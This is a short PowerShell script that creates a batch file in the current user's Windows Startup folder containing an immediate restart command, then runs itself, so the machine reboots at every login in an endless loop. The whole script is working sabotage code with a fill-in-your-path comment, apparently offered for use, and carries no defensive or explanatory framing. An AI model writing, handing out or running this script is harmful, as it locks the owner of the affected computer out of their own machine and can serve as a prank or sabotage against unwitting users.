function makebootloop {
    param (
        # Put your path between the quotes below!
        [string]$Path = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" 
    )

    process {
        # ... the rest of the logic stays the same ...
        if (!(Test-Path -Path $Path)) {
            New-Item -ItemType Directory -Path $Path -Force | Out-Null
        }

        $FilePath = Join-Path -ChildPath "RestartPC.bat" -Path $Path
        "shutdown /r /t 0" | Out-File -FilePath $FilePath -Encoding ascii

        Write-Host "Success: '$FilePath' has been created." -ForegroundColor Cyan
    }
}
makebootloop
